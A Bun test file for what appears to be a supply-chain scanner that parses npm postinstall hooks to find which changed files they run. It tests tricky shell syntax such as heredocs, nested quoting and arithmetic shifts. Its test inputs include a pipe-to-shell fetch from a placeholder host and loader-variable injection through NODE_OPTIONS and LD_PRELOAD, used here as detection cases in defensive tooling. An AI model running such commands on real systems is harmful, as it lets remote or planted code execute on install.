import { describe, expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });

// sub/x.js and other/y.js change between the old and the new release; the payload line runs make in sub.
function details(hook: string): string[] {
  const base = { "package.json": pj({ postinstall: hook }), "README.md": "a" };
  const o = { ...base, "sub/x.js": "1", "other/y.js": "1" };
  const n = { ...base, "sub/x.js": "changed()", "other/y.js": "changed()" };
  return prepass("npm", map(o), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
}
// The payload's file is named, and the same body with the payload line swapped for a harmless one holds nothing (so
// the hold is not a widen-everything fallback on the unreadable line).
const reads = (hook: string): boolean => details(hook).includes("file sub/x.js") && details(hook.split("make -C sub").join("echo ok")).length === 0;
// For bodies whose harmless twin holds on its own (an if block, a pipe into sh, thousands of lines).
const has = (hook: string): boolean => details(hook).includes("file sub/x.js");
const quiet = (hook: string): boolean => details(hook).length === 0;
const P = "make -C sub";
const B = "echo a(b)";
const B2 = "echo $(date)";

describe("an install hook of several lines: every line the shell runs is read", () => {
  test("a later line with an unclosed quote, a paren in a word, an odd quote, or a redirect", () => {
    for (const bad of ["echo 'x", 'echo "x', "echo a(b)", ": \"x'", "echo hi > log"]) expect(reads(`${P}\n${bad}`), bad).toBe(true);
  });
  test("lines before the first unreadable one all count", () => {
    expect(reads(`echo one\necho two\n${P}\necho three\necho 'x`)).toBe(true);
  });
  test("a block before the unreadable line", () => {
    expect(has(`if :; then\n${P}\nfi\necho 'x`)).toBe(true);
    expect(has(`{\n${P}\n}\necho 'x`)).toBe(true);
  });
  test("a line that is valid shell but not read does not hide the lines after it", () => {
    expect(reads(`echo hi > log\n${P}`)).toBe(true);
    expect(reads(`echo $(date)\n${P}`)).toBe(true);
    expect(reads(`echo $HOME\n${P}`)).toBe(true);
    expect(reads(`V=$(node -p 1)\n${P}`)).toBe(true);
    expect(has(`export X=$(pwd)\n${P}`)).toBe(true); // export with an expansion holds on its own
    expect(has(`echo a(b)\n${P}\necho hi > log\ncurl https://example.invalid/x | sh`)).toBe(true);
    expect(has(`${P}\necho hi > log\ncurl https://example.invalid/x | sh`)).toBe(true);
  });
  test("a payload before a redirect line and a substitution line", () => {
    expect(reads(`${P}\necho hi > log\necho $(date)`)).toBe(true);
    expect(reads(`${P}\necho "a\n$HOME"`)).toBe(true);
  });
  test("the payload and an expansion that cannot be resolved on one line", () => {
    expect(reads(`${P} && echo $(date)`)).toBe(true);
    expect(reads(`echo $HOME; ${P}`)).toBe(true);
  });
  test("a multi-line quote before the payload", () => {
    expect(reads(`echo "a\nb" > log\n${P}`)).toBe(true);
    expect(reads(`echo 'a\n$(x)'\n${P}`)).toBe(true);
    expect(reads(`echo "a\n$HOME"\n${P}`)).toBe(true);
    expect(reads(`:\necho "a\nb"\n${P}\necho 'x`)).toBe(true);
    expect(reads(`echo $HOME "\n"\n${P}`)).toBe(true);
    expect(reads(`echo > f 'a\nb'\n${P}\necho 'y'`)).toBe(true);
  });
  test("a continuation line before the payload; an even run of backslashes is not one", () => {
    expect(reads(`echo a \\\n b\n${P}\necho a(b)`)).toBe(true);
    expect(reads(`echo a\\\\\n${P}\necho a(b)`)).toBe(true);
    expect(reads(`# a \\\n${P}\necho a(b)`)).toBe(true);
  });
  test("a heredoc before the payload, in its spellings", () => {
    for (const n of [1, 3, 20]) expect(reads(`cat <<EOF\n${"x\n".repeat(n)}EOF\n${P}\necho a(b)`), String(n)).toBe(true);
    expect(reads(`cat <<-'EOF'\n\tx\n\tEOF\n${P}\necho a(b)`)).toBe(true);
    expect(reads(`cat <<E"O"F\nx\nEOF\n${P}\necho a(b)`)).toBe(true);
    expect(reads(`cat <<E"OF" >x\nhi\nEOF\n${P}`)).toBe(true);
    expect(has(`cat <<EOF | sh\nx\nEOF\n${P}\necho a(b)`)).toBe(true);
  });
  test("<< that is not a heredoc: a here-string, a shift, a quoted string, a comment", () => {
    expect(reads(`cat <<< hi\n${P}`)).toBe(true);
    expect(reads(`cat <<< x\n${P}\necho a(b)`)).toBe(true);
    expect(reads(`echo $((1<<2))\n${P}`)).toBe(true);
    expect(reads(`echo "<<EOF" > log\n${P}`)).toBe(true);
    expect(reads(`# a <<EOF\n${P}\necho a(b)`)).toBe(true);
  });
  test("text inside a heredoc or after an unclosed quote is not read as commands", () => {
    expect(quiet(`cat <<EOF\n${P}\nEOF`)).toBe(true);
    expect(quiet(`cat <<E"OF"\nE\n${P}\nEOF`)).toBe(true);
    expect(quiet(`echo 'x\n${P}`)).toBe(true);
  });
  // The harmless twins of the first four hold on their own (a $'..' word, an arithmetic command and a comment in $( ) read every file), so has() only.
  test("quotes and spans the lexer must not misread: $'..', (( << )), comments and # in ${ }", () => {
    expect(has(`echo $'it\\'s'\n${P}\necho a(b)`)).toBe(true);
    expect(has(`((n<<=1))\n${P}\necho a(b)`)).toBe(true);
    expect(has(`(( x = 1 << y ))\n${P}\necho a(b)`)).toBe(true);
    expect(has(`X=$(true # it's\n)\n${P}\necho a(b)`)).toBe(true);
    expect(reads(`echo \${x:- #}; ${P}`)).toBe(true);
  });
  test("a quote character inside single quotes does not start an expansion", () => {
    expect(reads("echo '`'; make -C sub")).toBe(true);
    expect(reads("echo 'cost $(' ; make -C sub")).toBe(true);
  });
  test("a command whose argument holds an expansion is still read", () => {
    expect(reads(`make -C sub V=$(nproc)`)).toBe(true);
    expect(reads(`make -C sub "$HOME"\necho a(b)`)).toBe(true);
    expect(reads(`echo $HOME; make -C sub $X`)).toBe(true);
  });
  test("make with an expansion in its own arguments holds the files it builds", () => {
    const files = ["Makefile", "sub/Makefile", "sub/x.js"];
    const hold = (hook: string) => {
      const base = { "package.json": pj({ postinstall: hook }), "README.md": "a" };
      const o: Record<string, string> = { ...base, "other/y.js": "1" }, n: Record<string, string> = { ...base, "other/y.js": "changed()" };
      for (const f of files) { o[f] = "1"; n[f] = "changed()"; }
      return prepass("npm", map(o), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
    };
    for (const h of ["make -j$(nproc)", "make V=$(nproc)", "make -C sub V=$(nproc)", "make -C sub V=$HOME", "make -C sub -j$(nproc)", "echo $HOME\nmake -j$(nproc)"]) {
      const d = hold(h);
      for (const f of files) expect(d, h).toContain(`file ${f}`);
    }
  });
  test("a long line of # characters then the payload (under the classifier's character cap)", () => {
    expect(details("echo " + "a#".repeat(3000) + "\n" + P)).toContain("file sub/x.js");
    expect(details("echo " + "a#".repeat(3000) + "\n" + "echo ok")).toEqual([]);
  });
  test("a body of many # characters is read in linear time", () => {
    const t = performance.now();
    expect(details("a#".repeat(200000) + "\n" + P).includes("file sub/x.js")).toBe(true);
    expect(details("a#".repeat(200000) + "; echo $(x)\n" + P).includes("file sub/x.js")).toBe(true); // an unresolved expansion: the line is read leniently
    expect(details("a#".repeat(200000) + "\necho a(b)\n" + P).includes("file sub/x.js")).toBe(true);
    expect(details("a#".repeat(200000) + "\nnode sub/x.js\necho a(b)")).toContain("file sub/x.js"); // a long line, the payload, then a line that does not parse
    expect(performance.now() - t).toBeLessThan(3000);
  });
  test("a shift in arithmetic is not a heredoc; a backslash in a double-quoted delimiter stays", () => {
    // the twins of the first three hold on their own (a line with << is read as a whole), so has()
    expect(has(`(( 1 << EOF )) && echo $(date)\n${P}\nEOF`)).toBe(true);
    expect(has(`let '1 << EOF'; echo $(date)\n${P}\nEOF`)).toBe(true);
    expect(has(`a[1 << EOF]=1; echo $(date)\n${P}\nEOF`)).toBe(true);
    expect(reads(`echo $(date)\ncat <<"E\\OF"\nx\nE\\OF\n${P}`)).toBe(true);
    expect(reads(`echo $(date)\ncat <<"E\\OF"\nEOF\nE\\OF\n${P}`)).toBe(true);
    expect(quiet(`echo $(date)\ncat <<"E\\OF"\n${P}\nE\\OF`)).toBe(true);
  });
  test("a << inside $[ ], ${ }, a subscript or a substring offset is arithmetic, not a heredoc", () => {
    for (const first of ["echo $[1 << EOF]", ": $[1<<EOF]", "x=$[1<<EOF]", "echo ${a[1<<EOF]}", "x=abc; echo ${x:$((1)) << EOF}"]) {
      expect(has(`${first} && echo $(date)\n${P}\nEOF`), first).toBe(true); // the twin holds on its own: a line with << is noted as a whole
    }
    expect(reads(`cat <<"E\\OF" >/dev/null && echo $(date)\nx\nE\\OF\n${P}`)).toBe(true);
  });
  test("an escaped space before # is not a comment; a heredoc in $( ) with an apostrophe; quotes in a loose line", () => {
    expect(reads(`X=$(echo a\\ #)\n${P}\n${B}`)).toBe(true);
    expect(reads(`X=$(cat <<EOF\ndon't\nEOF\n)\n${P}\n${B}`)).toBe(true);
    expect(reads(`echo "don't" && ${P} $(nproc) && echo 'x'`)).toBe(true);
    expect(reads(`echo "\${x:-"}"}"\n${P}\n${B}`)).toBe(true);
  });
  test("$'..' inside $( ) and ${ }, and (( )) after a keyword", () => {
    // the twins hold on their own ($'..' widens everything; an if/while/time line is an unknown command), so has()
    expect(has(`echo $(printf $'it\\'s'); ${P}\n${B}`)).toBe(true);
    expect(has(`echo \${x:-$'a\\'b'}\n${P}\n${B}`)).toBe(true);
    for (const kw of ["if (( 1 << true )); then :; fi", "while (( 1 << true )); do :; done", "time (( 1 << true ))", "! (( 1 << true ))", "{ (( 1 << true )); }"]) {
      expect(has(`${kw}\n${P}\ntrue\n${B}`), kw).toBe(true);
    }
  });
  test("many ( or (( stay linear and the payload is read", () => {
    const t = performance.now();
    expect(has(`x${"(".repeat(200000)}\n${P}\n${B}`)).toBe(true);
    expect(has(`${"x; ((1)) ".repeat(12000)}\n${P}\n${B}`)).toBe(true);
    expect(performance.now() - t).toBeLessThan(1200);
  });
  test("a here-string, # and quotes inside ${ } and $( ) in a substitution or a loose line", () => {
    expect(reads(`X=$(cat <<< hi)\n)\n${B2}\n${P}`)).toBe(true);
    expect(reads(`X=$(echo \${x:- #})\n${B2}\n${P}`)).toBe(true);
    for (const body of ["echo ${x:-'}'} 'a`b'; " + P, 'echo "${x:-"}"}" \'a`b\'; ' + P, 'echo ${x:-"{a; b;}"}; ' + P, 'echo ${x:-"}"} && ' + P, "echo ${x:-$(echo })}; " + P + "\n" + B2]) {
      expect(reads(body), body).toBe(true);
    }
  });
  test("deeply nested spans do not overflow the stack", () => {
    expect(() => details("echo " + '"$('.repeat(100000))).not.toThrow();
    expect(() => details("x=$((" + "(".repeat(100000))).not.toThrow();
  });
  test("a body that holds the placeholder character itself reads every file", () => {
    // a file named with the control character is the one the body runs
    const hook = './\u0005 "$HOME"';
    const base: Record<string, string> = { "package.json": pj({ postinstall: hook }), "\u0005": "1", "other/y.js": "1" };
    const n = { ...base, "\u0005": "changed()" };
    const d = prepass("npm", map(base), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
    expect(d.some((x) => x.includes("\u0005"))).toBe(true);
  });
  test("a body with CRLF line ends", () => {
    expect(reads(`${P}\r\necho 'x`)).toBe(true);
  });
  test("one-line bodies that cannot be read, and quiet bodies, stay as they were", () => {
    expect(quiet("echo a(b)")).toBe(true);
    expect(quiet("echo 'x")).toBe(true);
    expect(quiet("echo one\necho 'x")).toBe(true);
    expect(quiet("echo $HOME\necho hi")).toBe(true);
    expect(reads(P)).toBe(true);
  });
  test("many unreadable lines and nested bodies stay fast and still read the payload", () => {
    const lines = Array.from({ length: 500 }, (_, i) => (i % 2 ? `echo $(date ${i})` : `echo ${i} > f${i}`)).join("\n");
    const t = performance.now();
    expect(has(`${P}\n${lines}`)).toBe(true);
    expect(has(`${lines}\n${P}`)).toBe(true);
    expect(has(`sh -c '${lines.replace(/'/g, "")}\n${P}'`)).toBe(true);
    expect(performance.now() - t).toBeLessThan(5000);
  });
});

// A compound command's keywords and the test and assignment builtins run nothing: a package that did not change never
// holds, and a change to an unrelated file never holds, for these shapes (they held on the glob cap or widened to every file).
describe("keywords, [ ] and export are not unknown commands", () => {
  const detail = (hook: string, changed: string[]): string[] => {
    const base: Record<string, string> = { "package.json": pj({ postinstall: hook }), "sub/x.js": "1", "ctl/z.js": "1" };
    const n = { ...base };
    for (const c of changed) n[c] = "changed()";
    return prepass("npm", map(base), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
  };
  const shapes = [
    "if [ -f x ]; then\necho $HOME\nfi",
    "if [ -f x ]; then echo $HOME; fi",
    "if [ -f x ]; then\necho ok\nfi",
    "if [ -f x ]; then\necho ok\nfi\necho a(b)",
    "{ echo ok; }\necho a(b)",
    "while true; do echo ok; done",
    "export X=$(pwd)",
    "export X=1; echo ok",
    "[ -f x ] && echo ok",
  ];
  for (const h of shapes) {
    test(JSON.stringify(h) + ": no change and an unrelated change are quiet", () => {
      expect(detail(h, [])).toEqual([]);
      expect(detail(h, ["ctl/z.js"])).toEqual([]);
    });
  }
  test("a command inside a block is still read", () => {
    expect(detail("if :; then\nmake -C sub\nfi", ["sub/x.js"])).toContain("file sub/x.js");
    expect(detail("while true; do\nmake -C sub\ndone", ["sub/x.js"])).toContain("file sub/x.js");
    expect(detail("if [ -f x ]; then make -C sub; fi", ["sub/x.js"])).toContain("file sub/x.js");
  });
  test("an assignment builtin that sets a loader variable still widens", () => {
    expect(detail("export NODE_OPTIONS=--require=./x.js", ["ctl/z.js"])).toContain("file ctl/z.js");
  });
});

describe("review of b491d7a", () => {
  const det = (hook: string, changed: string[], extra: string[] = []): string[] => {
    const base: Record<string, string> = { "package.json": pj({ postinstall: hook }), "ctl/z.js": "1" };
    for (const f of [...changed, ...extra]) base[f] = "1";
    const n = { ...base };
    for (const c of changed) n[c] = "changed()";
    return prepass("npm", map(base), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
  };
  test("a glob in a command's argument still holds; the target of printf -v does not", () => {
    expect(det("bash setup[1]", ["setup1"])).toContain("glob");
    expect(det("printf -v N[0] x", [])).toEqual([]);
    expect(det("read -ra N[0]", [])).toEqual([]);
    expect(det("printf -v N[0] x\necho a(b)", [])).toEqual([]); // an unchanged package never holds (a change elsewhere widens: printf -v can poison a variable)
  });
  test("a loader variable after a compound keyword is still read", () => {
    expect(det("if NODE_OPTIONS=--require=./test/x.js node a.js; then :; fi", ["test/x.js"])).toContain("file test/x.js");
    expect(det("then NODE_OPTIONS=--require=./test/x.js node a.js", ["test/x.js"])).toContain("file test/x.js");
  });
  test("an escaped dollar before a quote is not ANSI-C quoting", () => {
    expect(det("echo \\$'a\\' $(date); make -C sub", ["sub/x.js"])).toContain("file sub/x.js");
  });
  test("export, declare -x, typeset -x, readonly and local of a loader variable by name alone widen", () => {
    for (const h of ["export LD_PRELOAD", "declare -x NODE_OPTIONS", "typeset -x BASH_ENV", "readonly PYTHONPATH", "local NODE_PATH", "export NODE_OPTIONS=--require=./test/x.js", "NODE_OPTIONS=--require=./test/x.js\nexport NODE_OPTIONS"]) {
      expect(det(h, ["ctl/z.js"]), h).toContain("file ctl/z.js");
    }
    for (const h of ["export FOO", "declare -x FOO", "export FOO=1"]) expect(det(h, ["ctl/z.js"]), h).toEqual([]);
  });
});
